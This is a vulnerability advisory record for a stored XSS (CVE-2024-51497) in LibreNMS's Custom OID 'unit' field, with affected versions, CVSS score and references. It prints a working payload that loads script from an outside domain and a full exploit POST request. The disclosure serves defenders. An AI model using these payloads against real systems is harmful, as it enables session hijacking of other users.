advisory_id: GHSA-gv4m-f6fx-859x
datasource_id: github_osv_importer_v2/GHSA-gv4m-f6fx-859x
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-gv4m-f6fx-859x/GHSA-gv4m-f6fx-859x.json
aliases:
  - CVE-2024-51497
summary: |
  LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/print-customoid.php
  ### Summary
  A Stored Cross-Site Scripting (XSS) vulnerability in the "Custom OID" tab of a device allows authenticated users to inject arbitrary JavaScript through the "unit" parameter when creating a new OID. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.

  ### Details
  When creating a new OID for a device, an attacker can inject an XSS payload into the "unit" parameter. This payload is reflected in the "Unit" column of the table displayed in the "Custom OID" tab of the device.

  The payload used to exploit this vulnerability is:
  ```<script/src=//15.rs>```

  Note: The payload uses the "15.rs" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.

  The vulnerability is due to improper sanitization of the "unit" parameter before rendering it in the HTML output. The sink is as follows:
  https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90

  ### PoC
  1. Create a new OID for a device using the following payload in the "unit" parameter:
  ```<script/src=//15.rs>```
  2. Save the OID.
  3. Navigate to the "Custom OID" tab of the device.
  4. Observe that the injected script executes in the "Unit" column of the table.

  Example Request:
  ```http
  POST /ajax_form.php HTTP/1.1
  Host: <your_host>
  Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  X-CSRF-TOKEN: <your_token>
  X-Requested-With: XMLHttpRequest
  Cookie: <your_cookie>

  device_id=15&device_name=test4'&ccustomoid_id=2&type=customoid&action=save&name=test1<script>{onerror=alert}throw+'OID'</script>&oid=test2<script>{onerror=alert}throw+'OID'</script>&unit=<script/src=//15.rs>&divisor=1&multiplier=1&user_func=test4<script>{onerror=alert}throw+'OID'</script>&limit=0&limit_low=0&limit_warn=0&limit_low_warn=0&passed=on
  ```

  ### Impact

  This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the "Custom OID" tab of the device. This could lead to the compromise of user accounts and unauthorized actions being performed on their behalf.
impacted_packages:
  - purl: pkg:composer/librenms/librenms
    affected_versions: vers:composer/<=24.9.1
    fixed_versions: vers:composer/24.10.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:L/A:L
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-gv4m-f6fx-859x/GHSA-gv4m-f6fx-859x.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-79
references:
  - url: https://github.com/librenms/librenms
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b
    reference_type:
    reference_id:
  - url: https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-51497
    reference_type:
    reference_id: CVE-2024-51497
